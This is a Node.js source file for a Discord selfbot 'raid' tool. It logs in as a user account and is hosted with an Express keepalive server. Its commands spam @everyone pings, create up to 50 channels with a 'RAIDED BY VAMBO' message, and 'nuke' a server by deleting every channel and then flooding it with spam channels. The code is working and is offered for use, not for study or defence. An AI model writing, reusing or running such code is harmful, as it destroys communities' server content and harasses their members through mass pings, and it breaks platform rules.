const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Add web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Raid selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !raid, !spam, or !nuke in any channel`);
});

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== CHANNEL SPAM COMMAND =====
    if (command === 'spamchannels') {
        const guild = message.guild;
        if (!guild) {
            message.reply('This command only works in servers!');
            return;
        }

        // Get number of channels to create (default 10)
        let channelCount = parseInt(args[0]) || 10;
        if (channelCount > 50) channelCount = 50; // Safety limit
        
        message.reply(`🔥 Creating **${channelCount}** channels with pings...`);
        
        // Channel name with Zalgo text
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        // Message with @everyone and @here pings
        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let created = 0;
        let failed = 0;

        for (let i = 0; i < channelCount; i++) {
            try {
                // Create channel with number suffix to avoid duplicates
                const channelSuffix = i > 0 ? `-${i}` : '';
                const newChannel = await guild.channels.create(channelName + channelSuffix, {
                    type: 'text'
                });
                
                // Send ping message in the new channel
                await newChannel.send(raidMessage);
                
                created++;
                console.log(`✅ Created channel #${i+1}`);
                
                // Small delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                failed++;
                console.error(`❌ Failed on channel ${i+1}:`, error.message);
            }
        }
        
        message.reply(`✅ **Raid complete!** Created ${created} channels, Failed: ${failed}`);
    }

    // ===== MESSAGE SPAM IN EXISTING CHANNELS =====
    if (command === 'spam') {
        const guild = message.guild;
        if (!guild) return;
        
        let messageCount = parseInt(args[0]) || 20;
        if (messageCount > 100) messageCount = 100; // Safety limit
        
        message.reply(`🔥 Spamming **${messageCount}** messages in this channel...`);
        
        const spamMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        for (let i = 0; i < messageCount; i++) {
            try {
                await message.channel.send(spamMessage);
                console.log(`✅ Sent message ${i+1}`);
                
                // Small delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 500));
                
            } catch (error) {
                console.error(`❌ Failed on message ${i+1}:`, error.message);
                break;
            }
        }
        
        message.reply(`✅ Spammed ${messageCount} messages!`);
    }

    // ===== DELETE ALL CHANNELS (NUKE) =====
    if (command === 'deletechannels') {
        const guild = message.guild;
        if (!guild) return;
        
        message.reply('🔥 **NUKING** all channels...');
        
        let deleted = 0;
        let failed = 0;
        
        for (const channel of guild.channels.cache.values()) {
            try {
                await channel.delete();
                deleted++;
                console.log(`✅ Deleted ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                failed++;
                console.error(`❌ Failed to delete ${channel.name}:`, error.message);
            }
        }
        
        // Create a new channel to announce completion
        try {
            const announceChannel = await guild.channels.create('GET-REKT', { type: 'text' });
            await announceChannel.send(`@everyone **NUKE COMPLETE!**\nDeleted ${deleted} channels, Failed: ${failed}\n\n**RAIDED BY VAMBO**`);
        } catch (error) {
            console.error('Could not create announce channel');
        }
        
        message.reply(`✅ Nuke complete! Deleted ${deleted} channels, Failed: ${failed}`);
    }

    // ===== FULL NUKE (DELETE + CREATE SPAM) =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) return;
        
        message.reply('💣 **FULL NUKE INITIATED** - Deleting all channels...');
        
        // Step 1: Delete all channels
        let deleted = 0;
        for (const channel of guild.channels.cache.values()) {
            try {
                await channel.delete();
                deleted++;
                console.log(`✅ Deleted ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                console.error(`❌ Failed to delete:`, error.message);
            }
        }
        
        // Step 2: Create spam channels (50 of them)
        message.reply(`🔥 Deleted ${deleted} channels. Creating 50 raid channels...`);
        
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let created = 0;
        for (let i = 0; i < 50; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                created++;
                console.log(`✅ Created channel ${i+1}`);
                await new Promise(resolve => setTimeout(resolve, 800));
            } catch (error) {
                console.error(`❌ Failed to create channel ${i+1}:`, error.message);
            }
        }
        
        message.reply(`💀 **NUKE COMPLETE!** Deleted ${deleted} channels, Created ${created} spam channels with @everyone pings.`);
    }
});

client.login(TOKEN);
